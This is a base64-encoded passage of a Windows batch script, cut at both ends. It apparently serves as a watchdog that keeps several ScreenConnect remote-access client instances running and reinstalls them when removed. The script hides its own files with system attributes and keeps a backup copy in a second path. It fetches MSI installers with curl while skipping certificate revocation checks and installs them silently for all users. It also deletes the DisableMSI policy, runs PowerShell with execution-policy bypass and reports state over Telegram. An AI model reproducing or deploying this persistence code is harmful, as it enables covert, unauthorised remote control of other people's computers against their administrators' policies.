T0clIg0KICBhdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBt
b3ZlIC95ICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0K
KQ0KcmVtIGtlZXAgZHVhbC1wYXRoIGJhY2t1cCBpbiBzeW5jIGV2ZXJ5IHRpY2sNCmlmIG5vdCBl
eGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxvd25f
bW9uLmNtZCIgKA0KICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+
JjENCiAgY29weSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVs
IDI+JjENCikNCmRlbCAvZiAvcSAiJU1VVEVYJSIgPm51bCAyPiYxDQoNCmVjaG8gdGljayBkb25l
OiBwcmltPSVQUklNX09LJSBncnl4YT0lR1JZWEFfT0slIGFsdD0lQUxUX09LJSBmb3JlaWduPSVG
T1JFSUdOX0xFRlQlPj4iJUxPRyUiDQplbmRsb2NhbA0KZXhpdCAvYiAwDQoNCnJlbSDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCjpFbnN1cmVHcnl4YU11c3QNCnJl
bSBHcnl4YSBpcyBtYW5kYXRvcnk6IGtlZXAgY2xpbWJpbmcgdW50aWwgc2VydmljZSBpcyBSVU5O
SU5HIChvciBsYWRkZXIgZXhoYXVzdGVkKS4NCnNldCAiR1JZWEFfT0s9MCINCnNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0K
aWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAgZWNobyBncnl4YV9h
bHJlYWR5X3J1bm5pbmc+PiIlTE9HJSINCiAgZXhpdCAvYiAwDQopDQplY2hvIGdyeXhhX211c3Rf
YmVnaW4+PiIlTE9HJSINCg0KcmVtIDEpIHNlcnZpY2UgcHJlc2VudCBidXQgc3RvcHBlZCAtPiBz
dGFydCBoYXJkDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+
bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGdyeXhhX3N2Y19zdGFydD4+
IiVMT0clIg0KICBzYyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIg
c3RhcnQ9IGF1dG8gPm51bCAyPiYxDQogIHNjIGZhaWx1cmUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglR1JZWEFfRlAlKSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0
LzMwMDAvcmVzdGFydC8zMDAwID5udWwgMj4mMQ0KICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsg
Pm51bA0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVs
IDI+JjENCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBm
aW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHNldCAiR1JZ
WEFfT0s9MSINCiAgICBlY2hvIGdyeXhhX3N0YXJ0ZWRfb2s+PiIlTE9HJSINCiAgICBleGl0IC9i
IDANCiAgKQ0KKQ0KDQpyZW0gMikgcmVnaXN0ZXJlZCBwcm9kdWN0IC0+IG1zaWV4ZWMgL2ZhIHJl
cGFpciBPTkxZIChuZXZlciAvaSBvbiB0b3Ag4oCUIGtpbGxzIHBhbmVsIHNlc3Npb24pDQpzZXQg
IkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJh
Y2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
b24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAi
R1JFRz0lJVIiDQplY2hvIGdyeXhhX3JlZ2lzdGVyZWQ9IUdSRUchPj4iJUxPRyUiDQppZiAvSSAi
IUdSRUchIj09InllcyIgKA0KICBlY2hvIGdyeXhhX3JlcGFpcl9iZWdpbj4+IiVMT0clIg0KICBp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZXBhaXIgLUZwICIlR1JZWEFfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUi
IDI+JjENCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgY29uZmlnICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0KICBzYyBz
dGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgdGlt
ZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVs
IDEgKA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICBlY2hvIGdyeXhhX3JlcGFpcmVkX29rPj4i
JUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCiAgcmVtIGNsZWFuIHJlaW5zdGFsbDogL3ggdGhl
biAvaSAoc2FmZXIgdGhhbiAvaSBvdmVyIHJlZ2lzdGVyZWQg4oCUIGF2b2lkcyBVcGdyYWRlIGNo
dXJuKQ0KICBlY2hvIGdyeXhhX2NsZWFuX3JlaW5zdGFsbF9iZWdpbj4+IiVMT0clIg0KICBpZiBl
eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICAgIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIg
JSVHIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJG49J1NjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFf
RlAlKSc7IGZvcmVhY2goJHIgaW4gQCgnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9z
b2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywnSEtMTTpcU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykpeyBpZihUZXN0LVBhdGgg
JHIpeyBHZXQtQ2hpbGRJdGVtICRyIC1FQSAwIHwgJSUgeyAkcD1HZXQtSXRlbVByb3BlcnR5ICRf
LlBTUGF0aCAtRUEgMDsgaWYoJHAuRGlzcGxheU5hbWUgLWVxICRuIC1hbmQgJF8uUFNDaGlsZE5h
bWUgLWxpa2UgJ3sqfScpeyAkXy5QU0NoaWxkTmFtZTsgYnJlYWsgfSB9IH0gfSJgKSBkbyBzZXQg
IkdHVUlEPSUlRyINCiAgKQ0KICBpZiBkZWZpbmVkIEdHVUlEICgNCiAgICBjYWxsIDpOb01zaVBv
bGljeQ0KICAgIG1zaWV4ZWMgL3ggIUdHVUlEISAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5
U3VwcHJlc3MgPj4iJUxPRyUiIDI+JjENCiAgICBlY2hvIGdyeXhhX3VuaW5zdGFsbF9leGl0PSFF
UlJPUkxFVkVMIT4+IiVMT0clIg0KICAgIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQogICkN
CikNCg0KcmVtIDMpIG9ycGhhbiBzZXJ2aWNlIChwcmVzZW50LCBub3QgcmVnaXN0ZXJlZCkgLT4g
ZGVsZXRlIHRoZW4gZnJlc2ggaW5zdGFsbA0KaWYgL0kgbm90ICIhR1JFRyEiPT0ieWVzIiAoDQog
IHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0K
ICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGdyeXhhX29ycGhhbl9zdmNfZGVsZXRl
Pj4iJUxPRyUiDQogICAgc2Mgc3RvcCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUp
IiA+bnVsIDI+JjENCiAgICBzYyBkZWxldGUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFf
RlAlKSIgPm51bCAyPiYxDQogICAgdGltZW91dCAvdCAzIC9ub2JyZWFrID5udWwNCiAgKQ0KICBp
ZiBleGlzdCAiJVByb2dyYW1GaWxlcyh4ODYpJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhB
X0ZQJSkiICgNCiAgICBlY2hvIGdyeXhhX3N0YWxlX2Rpcl9jbGVhbj4+IiVMT0clIg0KICAgIHJt
ZGlyIC9zIC9xICIlUHJvZ3JhbUZpbGVzKHg4NiklXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZ
WEFfRlAlKSIgPm51bCAyPiYxDQogICkNCikNCg0KcmVtIDQpIGZyZXNoIE1TSSBpbnN0YWxsIG9u
bHkgd2hlbiBwcm9kdWN0IG5vdCBjdXJyZW50bHkgUnVubmluZw0KZWNobyBncnl4YV9pbnN0YWxs
X2JlZ2luPj4iJUxPRyUiDQppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhl
Ig0Kc2V0ICJHX01TSV9SRUFEWT0wIg0KaWYgZXhpc3QgIiVNU0lDQUNIRV9HJSIgZm9yICUlRiBp
biAoIiVNU0lDQUNIRV9HJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgY29weSAveSAi
JU1TSUNBQ0hFX0clIiAiJU1TSV9HJSIgPm51bCAyPiYxDQogIHNldCAiR19NU0lfUkVBRFk9MSIN
CiAgZWNobyBncnl4YV9tc2lfZnJvbV9jYWNoZT4+IiVMT0clIg0KKQ0KaWYgIiVHX01TSV9SRUFE
WSUiPT0iMCIgKA0KICAiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVv
dXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0lfRyUudG1wIiAiJU1TSV9HUllYQSUiID4+IiVM
T0clIiAyPiYxDQogIGZvciAlJUYgaW4gKCIlTVNJX0clLnRtcCIpIGRvIGlmICUlfnpGIEdUUiAx
MDAwMDAwICgNCiAgICBtb3ZlIC95ICIlTVNJX0clLnRtcCIgIiVNU0lfRyUiID5udWwgMj4mMQ0K
ICAgIGNvcHkgL3kgIiVNU0lfRyUiICIlTVNJQ0FDSEVfRyUiID5udWwgMj4mMQ0KICAgIHNldCAi
R19NU0lfUkVBRFk9MSINCiAgICBlY2hvIGdyeXhhX21zaV9mZXRjaGVkPj4iJUxPRyUiDQogICkN
CiAgZGVsIC9mIC9xICIlTVNJX0clLnRtcCIgPm51bCAyPiYxDQopDQppZiAiJUdfTVNJX1JFQURZ
JSI9PSIwIiAoDQogICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUg
MzAwIC1vICIlTVNJX0clLnRtcCIgIiVNU0lfR1JZWEElIiA+PiIlTE9HJSIgMj4mMQ0KICBmb3Ig
JSVGIGluICgiJU1TSV9HJS50bXAiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgbW92
ZSAveSAiJU1TSV9HJS50bXAiICIlTVNJX0clIiA+bnVsIDI+JjENCiAgICBjb3B5IC95ICIlTVNJ
X0clIiAiJU1TSUNBQ0hFX0clIiA+bnVsIDI+JjENCiAgICBzZXQgIkdfTVNJX1JFQURZPTEiDQog
ICkNCiAgZGVsIC9mIC9xICIlTVNJX0clLnRtcCIgPm51bCAyPiYxDQopDQppZiAiJUdfTVNJX1JF
QURZJSI9PSIxIiAoDQogIGNhbGwgOk5vTXNpUG9saWN5DQogIG1zaWV4ZWMgL2kgIiVNU0lfRyUi
IC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVX
RCVcbXNpX2dyeXhhLmxvZyIgPj4iJUxPRyUiIDI+JjENCiAgc2V0ICJHRVhJVD0hRVJST1JMRVZF
TCEiDQogIGVjaG8gZ3J5eGFfbXNpZXhlY19leGl0PSFHRVhJVCE+PiIlTE9HJSINCiAgaWYgIiFH
RVhJVCEiPT0iMTYxOCIgKA0KICAgIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICAgIG1z
aWV4ZWMgL2kgIiVNU0lfRyUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxs
eVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2dyeXhhMi5sb2ciID4+IiVMT0clIiAyPiYxDQogICAg
c2V0ICJHRVhJVD0hRVJST1JMRVZFTCEiDQogICAgZWNobyBncnl4YV9tc2lleGVjX3JldHJ5MTYx
OD0hR0VYSVQhPj4iJUxPRyUiDQogICkNCiAgaWYgIiFHRVhJVCEiPT0iMTYxOCIgKA0KICAgIHRp
bWVvdXQgL3QgNDUgL25vYnJlYWsgPm51bA0KICAgIG1zaWV4ZWMgL2kgIiVNU0lfRyUiIC9xbiAv
bm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNp
X2dyeXhhMy5sb2ciID4+IiVMT0clIiAyPiYxDQogICAgc2V0ICJHRVhJVD0hRVJST1JMRVZFTCEi
DQogICAgZWNobyBncnl4YV9tc2lleGVjX3JldHJ5MTYxOGI9IUdFWElUIT4+IiVMT0clIg0KICAp
DQogIHRpbWVvdXQgL3QgMTAgL25vYnJlYWsgPm51bA0KKSBlbHNlICgNCiAgZWNobyBncnl4YV9t
c2lfZmV0Y2hfRkFJTD4+IiVMT0clIg0KKQ0KDQpyZW0gNSkgcG9zdC1pbnN0YWxsOiByZXBhaXIg
aWYgc3ZjIHN0aWxsIG1pc3NpbmcsIHRoZW4gZm9yY2Ugc3RhcnQNCnNjIHF1ZXJ5ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIGlm
IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGVjaG8gZ3J5eGFfcG9zdGluc3RhbGxfcmVw
YWlyPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVw
YWlyIC1GcCAiJUdSWVhBX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRp
bWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQopDQpzYyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglR1JZWEFfRlAlKSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYyBmYWlsdXJlICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0
YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCA+bnVsIDI+JjENCnNjIHN0YXJ0ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KdGltZW91dCAvdCA1
IC9ub2JyZWFrID5udWwNCnNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQ
JSkiID5udWwgMj4mMQ0KdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCnNjIHN0YXJ0ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KDQpyZW0gbXNpZXhlYyBv
ZiBncnl4YSBjYW4gZGlzdHVyYiBzZXZyeiAtIG51ZGdlIGtlZXBlcnMgYmFjayB1cA0Kc2MgY29u
ZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgc3RhcnQ9IGF1dG8gPm51bCAy
PiYxDQpzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
MQ0Kc2MgY29uZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiBzdGFydD0gYXV0
byA+bnVsIDI+JjENCnNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
bnVsIDI+JjENCmNhbGwgOlJlc3RvcmVBbHQNCg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZl
bCAxICgNCiAgc2V0ICJHUllYQV9PSz0xIg0KICBlY2hvIGdyeXhhX211c3RfcnVubmluZ19vaz4+
IiVMT0clIg0KKSBlbHNlICgNCiAgc2V0ICJHUllYQV9PSz0wIg0KICBlY2hvIGdyeXhhX211c3Rf
c3RpbGxfZG93bj4+IiVMT0clIg0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVH
UllYQV9GUCUpIiA+PiIlTE9HJSIgMj4mMQ0KKQ0KZXhpdCAvYiAwDQoNCjpJbnN0YWxsTXNpDQpy
ZW0gJTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0Kc2V0ICJUQUc9JX4yIg0KZWNobyBbJVRB
RyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1j
b25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+
PiIlTE9HJSIgMj4mMQ0KZm9yICUlRiBpbiAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAx
MDAwMDAwICgNCiAgZWNobyBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwgL2Yg
L3EgIiVNU0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1TSSUu
dG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KY2FsbCA6Tm9Nc2lQb2xpY3kNCnJlbSBNMTM6IHN0YWxl
IHByaW1hcnkgZGlyIChzZXJ2aWNlIGRlbGV0ZWQsIHByb2R1Y3QgdW5yZWdpc3RlcmVkKSBicmVh
a3MNCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gLSBjbGVhciBpdCBiZWZvcmUg
aW5zdGFsbGluZw0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+
bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVBGODYlXFNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglS0VFUF9GUCUpIiAoDQogIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIl
TE9HJSINCiAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBf
RlAlKSIgPm51bCAyPiYxDQopDQplY2hvIFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUi
DQptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVh
bGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0Kc2V0ICJNU0lF
WElUPSFFUlJPUkxFVkVMISINCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4i
JUxPRyUiDQppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgNCiAgZWNobyBbJVRBRyVdIG1zaV9idXN5
X3JldHJ5Pj4iJUxPRyUiDQogIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICBtc2lleGVj
IC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJl
c3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjENCiAgc2V0ICJNU0lFWElUPSFF
UlJPUkxFVkVMISINCiAgZWNobyBbJVRBRyVdIG1zaWV4ZWNfcmV0cnkgZXhpdD0hTVNJRVhJVCE+
PiIlTE9HJSINCikNCmNhbGwgOldhaXRTdmMNCmNhbGwgOlJlc3RvcmVBbHQNCnJlbSBPMzc6IHNl
dnJ6IC9pIHNoYXJlcyBsZWdhY3kgVXBncmFkZUNvZGVzIHdpdGggZ3J5eGEg4oCUIGFsd2F5cyBy
ZS1lbnN1cmUgR3J5eGEgYWZ0ZXINCmNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KZXhpdCAvYiAwDQpy
ZW0gJTE9ZmluZ2VycHJpbnQgLSBzZXJ2aWNlIGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJl
ZDogcmVwYWlyIGJ5IEdVSUQuDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCV+MSki
ID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDANCmlmIG5vdCBleGlzdCAi
JVdEJVxvd25fbGliLnBzMSIgZXhpdCAvYiAxDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIHJlcGFpciAtRnAgIiV+MSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYx
DQpjYWxsIDpXYWl0U3ZjDQpleGl0IC9iIDANCg0KOlJlc3RvcmVBbHQNCnJlbSBBTFQgc2Vydmlj
ZSBnb25lIGJ1dCBzdGlsbCByZWdpc3RlcmVkIChTQy1mYW1pbHkgbXNpZXhlYyBzaWRlIGVmZmVj
dCkgLSByZXBhaXIgaXQgdG9vLg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxU
X0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDANCmVjaG8gYWx0
IG1pc3NpbmcgLSByZXBhaXIgYXR0ZW1wdD4+IiVMT0clIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xp
Yi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAi
JUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0Kc2MgcXVlcnkgIlNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90
IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIg0KZXhpdCAvYiAwDQoNCjpOb01zaVBvbGljeQ0K
cmVnIGRlbGV0ZSAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0
YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRX
QVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAv
ZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
bmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwg
Mj4mMQ0KZXhpdCAvYiAwDQoNCjpXYWl0U3ZjDQpzZXQgIlRSSUVTPTAiDQo6V2FpdExvb3ANCnNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5H
IiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJTlNUQUxMRUQ9MSINCiAgc2V0
ICJQUklNX09LPTEiDQogIGV4aXQgL2IgMA0KKQ0Kc2V0IC9hIFRSSUVTKz0xDQppZiAlVFJJRVMl
IEdFUSAxMCBleGl0IC9iIDENCnBpbmcgMTI3LjAuMC4xIC1uIDcgPm51bCAyPiYxDQpnb3RvIDpX
YWl0TG9vcA0KDQo6VGdTdGF0ZQ0Kc2V0ICJORVdTVEFURT0lfjEiDQpzZXQgIk1TRz0lfjIiDQpz
ZXQgIk9MRFNUQVRFPSINCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RB
VEUlIg0KcmVtIGZhbHNlIERPV04gYWZ0ZXIgcmVib290IHJhY2U6IHByaW1hcnkgYWxyZWFkeSBS
dW5uaW5nIOKAlCBkbyBub3Qgc3BhbQ0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgKA0KICBz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
RyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3NraXBfZG93bl9h
bHJlYWR5X3J1bm5pbmc+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KcmVtIHJhdGUt
bGltaXQgcmVwZWF0ZWQgRE9XTi9GQUlMOiBtYXggMSBhbGVydCBwZXIgNmggd2hpbGUgc3R1Y2sN
CmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04iIGdvdG8gOk1heWJlU3VwcHJlc3MNCmlmIC9JICIl
TkVXU1RBVEUlIj09IkZBSUwiIGdvdG8gOk1heWJlU3VwcHJlc3MNCmdvdG8gOlNlbmRBbGVydA0K
Ok1heWJlU3VwcHJlc3MNCmlmIC9JICIlTkVXU1RBVEUlIj09IiVPTERTVEFURSUiIGlmIGV4aXN0
ICIlV0QlXHRnX3NlbnQuZmxhZyIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVy
YWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAt
bHQgMzYwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjENCiAgaWYgbm90IGVycm9ybGV2
ZWwgMSAoDQogICAgZWNobyB0Z19zdXBwcmVzc2VkXyVORVdTVEFURSU+PiIlTE9HJSINCiAgICBl
eGl0IC9iIDANCiAgKQ0KKQ0KOlNlbmRBbGVydA0KZWNobyAlTkVXU1RBVEUlPiIlU1RBVEUlIg0K
ZWNobyBzZW50PiIlV0QlXHRnX3NlbnQuZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0
